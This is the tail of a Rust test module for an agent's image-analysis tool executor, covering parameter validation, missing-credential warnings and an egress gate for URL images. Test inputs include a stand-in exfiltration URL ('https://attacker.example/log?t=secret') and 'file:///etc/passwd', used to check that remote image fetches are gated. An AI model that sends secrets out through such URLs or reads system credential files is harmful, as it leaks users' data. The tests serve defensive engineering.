            )
            .unwrap_err();
        assert!(matches!(
            err,
            ExecError::Vision(VisionToolError::InvalidDetail(_))
        ));
    }

    #[test]
    fn valid_detail_levels_are_accepted_but_noop_for_claude() {
        let dir = std::env::temp_dir().join(format!("vis-det2-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("pic.png"), png_bytes()).unwrap();
        let exec = stub_executor(&dir);
        for d in ["low", "high", "auto"] {
            let ok = exec.execute(
                "image_analysis",
                &[
                    ("prompt".into(), "x".into()),
                    ("images".into(), "pic.png".into()),
                    ("detail".into(), d.into()),
                ],
            );
            assert!(ok.is_ok(), "detail={d} should be accepted: {ok:?}");
        }
    }

    #[test]
    fn missing_provider_key_returns_warning_not_error() {
        // A vision client that fails closed on a missing key (like ClaudeVisionClient::from_env
        // with no FRIDAY_ANTHROPIC_API_KEY) ⇒ the executor returns a result CARRYING the warning,
        // NOT an Err (so the model sees it). Mirrors web_search's missing-key receipt.
        struct NoKeyClient;
        impl VisionModelClient for NoKeyClient {
            fn analyze(
                &self,
                _r: &VisionRequest,
            ) -> Result<friday_vision::VisionOutcome, friday_vision::VisionError> {
                Err(friday_vision::VisionError::CredentialMissing(
                    "FRIDAY_ANTHROPIC_API_KEY",
                ))
            }
        }
        let dir = std::env::temp_dir().join(format!("vis-nokey-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("pic.png"), png_bytes()).unwrap();
        let exec = VisionExecutor::new(&dir, Box::new(NoKeyClient));
        let receipt = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "x".into()),
                    ("images".into(), "pic.png".into()),
                ],
            )
            .expect("missing key returns Ok(receipt), never an Err");
        let content = receipt.content.unwrap();
        assert!(
            content.contains("no vision provider credential"),
            "content: {content}"
        );
        assert!(content.contains("FRIDAY_ANTHROPIC_API_KEY"));
    }

    #[test]
    fn unsupported_action_on_vision_executor() {
        let exec = stub_executor(std::env::temp_dir());
        let err = exec
            .execute("read_file", &[("path".into(), "x".into())])
            .unwrap_err();
        assert!(matches!(err, ExecError::Unsupported(_)));
    }

    #[test]
    fn media_type_helpers() {
        assert_eq!(media_type_from_extension("a/b/c.PNG"), Some("image/png"));
        assert_eq!(media_type_from_extension("x.jpeg"), Some("image/jpeg"));
        assert_eq!(media_type_from_extension("x.txt"), None);
        assert_eq!(
            sniff_image_media_type(&[0xFF, 0xD8, 0xFF, 0x00]),
            Some("image/jpeg")
        );
        assert_eq!(sniff_image_media_type(b"not an image"), None);
    }

    // ── BUG 2: image_analysis egress (URL-image) classification ──

    #[test]
    fn image_source_kind_detection_matches_acquire_image_branches() {
        // The shared classifier MUST agree with the `acquire_image` branch order: `data:` first
        // (even when its payload contains the substring "http"), then http(s) SCHEME (prefix, not
        // `contains`), then file://, else workspace path. This is the predicate the gate trusts.
        assert_eq!(image_source_kind("http://x/a.png"), ImageSourceKind::Url);
        assert_eq!(image_source_kind("https://x/a.png"), ImageSourceKind::Url);
        // A data: URI whose payload string contains "http://" must NOT be read as a URL.
        assert_eq!(
            image_source_kind("data:image/png;base64,aHR0cDovL2V2aWw="),
            ImageSourceKind::DataUri
        );
        assert_eq!(
            image_source_kind("file:///etc/passwd"),
            ImageSourceKind::FileScheme
        );
        assert_eq!(
            image_source_kind("sub/dir/pic.png"),
            ImageSourceKind::WorkspacePath
        );
    }

    #[test]
    fn url_image_is_classified_mutating_local_forms_are_not() {
        // EXFILTRATION GATE: any http(s) URL image ⇒ the call classifies mutating (so it is gated
        // BEFORE the executor opens the egress socket). Local-only forms stay read-only (no socket,
        // no-degrade). Parses the `images` param exactly as the executor does.
        let url = vec![
            ("prompt".to_string(), "x".to_string()),
            (
                "images".to_string(),
                "https://attacker.example/log?t=secret".to_string(),
            ),
        ];
        assert!(
            image_analysis_has_url_image(&url),
            "URL image must classify mutating"
        );

        // Mixed: a local image PLUS a URL image ⇒ still mutating (the URL leaks).
        let mixed = vec![
            ("prompt".to_string(), "x".to_string()),
            (
                "images".to_string(),
                "pic.png\nhttps://attacker.example/log".to_string(),
            ),
        ];
        assert!(image_analysis_has_url_image(&mixed));

        // Local-only forms ⇒ NOT mutating (read-only, fires immediately).
        for local in [
            "pic.png",
            "sub/dir/pic.png",
            "data:image/png;base64,aHR0cDovL3g=", // payload contains "http://" — must NOT trip
            "file:///etc/passwd",                 // rejected by the executor, but no egress
        ] {
            let params = vec![
                ("prompt".to_string(), "x".to_string()),
                ("images".to_string(), local.to_string()),
            ];
            assert!(
                !image_analysis_has_url_image(&params),
                "local form {local:?} must stay non-mutating (no egress)"
            );
        }

        // No images param at all ⇒ not mutating (a MissingParam error is raised later).
        assert!(!image_analysis_has_url_image(&[(
            "prompt".to_string(),
            "x".to_string()
        )]));
    }

    // ── BUG 4: MAX_IMAGES vs crash-recovery staleness ──

    #[test]
    fn max_images_staleness_invariant() {
        // The WHOLE sequential image_analysis dispatch must finish within the crash-recovery
        // staleness threshold (the heartbeat is set once before the dispatch, never refreshed
        // mid-tool). Worst case = MAX_IMAGES × (per-image fetch timeout + per-call vision timeout).
        // At the FORMER cap of 8 this was 8 × 90s = 720s ≫ 300s (the false-abort hole this fixes);
        // at the capped 2 it is 180s, a 120s margin. This is CONDITIONAL on the assumed 60s
        // per-call anthropic timeout (tracked separately — see ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED).
        let per_image_ms = IMAGE_FETCH_TIMEOUT_MS + ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED;
        let worst_case_ms = (MAX_IMAGES as u64) * per_image_ms;
        assert!(
            (worst_case_ms as i64) < crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS,
            "MAX_IMAGES={MAX_IMAGES} worst-case {worst_case_ms}ms must stay under the \
             {}ms staleness threshold (else a live multi-image call false-aborts as a crash)",
            crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS
        );
        // Pin the regression: the FORMER cap of 8 would have BLOWN the threshold (720s > 300s).
        let former_worst_case_ms = 8u64 * per_image_ms;
        assert!(
            (former_worst_case_ms as i64)
                >= crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS,
            "sanity: the former cap of 8 should exceed the threshold (proving the fix matters)"
        );
    }
}
